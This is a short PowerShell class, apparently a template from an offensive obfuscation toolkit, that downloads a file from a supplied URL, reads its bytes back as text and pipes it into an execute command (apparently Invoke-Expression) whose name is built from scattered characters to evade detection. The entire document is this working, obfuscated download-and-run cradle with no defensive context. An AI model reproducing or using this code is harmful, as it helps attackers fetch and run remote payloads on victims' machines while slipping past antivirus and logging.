Class ObfDownloadFile14 {

    static Execute ([String]$url, [String]$path) {
        #CLI:  Disk\PsWebFile\Invoke\9
        (New-Object Net.WebClient).DownloadFile($url,$path);(-Join((Get-Content $path -Encodi Byte)|%{[Char](GV _).Value}))|&( ''.LastIndexOfAny.ToString()[126,45,130]-Join'')
    }

}